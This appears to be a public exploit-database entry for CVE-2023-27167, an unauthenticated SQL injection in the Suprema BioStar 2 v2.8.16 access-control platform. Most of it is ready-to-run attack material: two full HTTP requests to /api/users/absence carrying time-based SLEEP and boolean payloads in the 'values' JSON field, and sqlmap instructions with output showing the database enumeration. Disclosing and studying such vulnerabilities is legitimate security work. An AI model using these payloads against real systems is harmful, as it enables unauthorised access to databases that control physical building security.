@@ -1,0 +1,104 @@
+id: 38562
+date: 04/08/2023
+title: Suprema BioStar 2 v2.8.16 - SQL Injection Vulnerability
+author: Yuriy Tsarenko
+cves: CVE-2023-27167
+
+# Exploit Title: Suprema BioStar 2 v2.8.16 - SQL Injection
+# Exploit Author: Yuriy (Vander) Tsarenko (https://www.linkedin.com/in/yuriy-tsarenko-a1453aa4/)
+# Vendor Homepage: https://www.supremainc.com/
+# Software Link: https://www.supremainc.com/en/platform/hybrid-security-platform-biostar-2.asp
+# Software Download: https://support.supremainc.com/en/support/solutions/articles/24000076543--biostar-2-biostar-2-8-16-new-features-and-configuration-guide
+# Version: 2.8.16
+# Tested on: Windows, Linux
+# CVE-2023-27167
+
+## Description 
+A Boolean-based SQL injection/Time based SQL vulnerability in the page (/api/users/absence?search_month=1) in Suprema BioStar 2 v2.8.16 allows remote unauthenticated attackers to execute remote arbitrary SQL commands through "values" JSON parameter. 
+
+## Request PoC #1
+'''
+POST /api/users/absence?search_month=1 HTTP/1.1
+Host: biostar2.server.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+content-type: application/json;charset=UTF-8
+content-language: en
+bs-session-id: 207c1c3c3b624fcc85b7f0814c4bf548
+Content-Length: 204
+Origin: https://biostar2.server.net
+Connection: close
+Referer: https://biostar2.server.net/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{"Query":{"offset":0,"limit":51,"atLeastOneFilterExists":true,"conditions":[{"column":"user_group_id.id","operator":2,"values":["(select*from(select(sleep(4)))a)",4840,20120]}],"orders":[],"total":false}}
+
+'''
+
+Time based SQL injection (set 4 – response delays for 8 seconds).
+
+'''
+
+## Request PoC #2
+'''
+POST /api/users/absence?search_month=1 HTTP/1.1
+Host: biostar2.server.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+content-type: application/json;charset=UTF-8
+content-language: en
+bs-session-id: 207c1c3c3b624fcc85b7f0814c4bf548
+Content-Length: 188
+Origin: https://biostar2.server.net
+Connection: close
+Referer: https://biostar2.server.net/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{"Query":{"offset":0,"limit":51,"atLeastOneFilterExists":true,"conditions":[{"column":"user_group_id.id","operator":2,"values":["1 and 3523=03523",4840,20120]}],"orders":[],"total":false}}
+
+'''
+
+Boolean-based SQL injection (payload “1 and 3523=03523” means “1 and True”, so we can see information in response, regarding user with id 1, which is admin)
+
+'''
+
+## Exploit with SQLmap
+
+Save the request from Burp Suite to file.
+
+'''
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"Query":{"offset":0,"limit":51,"atLeastOneFilterExists":true,"conditions":[{"column":"user_group_id.id","operator":2,"values":["1 and 3523=03523",4840,20120]}],"orders":[],"total":false}}
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {"Query":{"offset":0,"limit":51,"atLeastOneFilterExists":true,"conditions":[{"column":"user_group_id.id","operator":2,"values":["(select*from(select(sleep(7)))a)",4840,20120]}],"orders":[],"total":false}}
+---
+[05:02:49] [INFO] testing MySQL
+[05:02:49] [INFO] confirming MySQL
+[05:02:50] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL > 5.0.0 (MariaDB fork)
+[05:02:50] [INFO] fetching database names
+[05:02:50] [INFO] fetching number of databases
+[05:02:54] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[05:02:55] [INFO] retrieved: 2
+[05:03:12] [INFO] retrieved: biostar2_ac
+[05:03:56] [INFO] retrieved: information_schema
+available databases [2]:
+[*] biostar2_ac
+[*] information schema
+
+'''
+
+#  0day.today [2023-04-19]  #
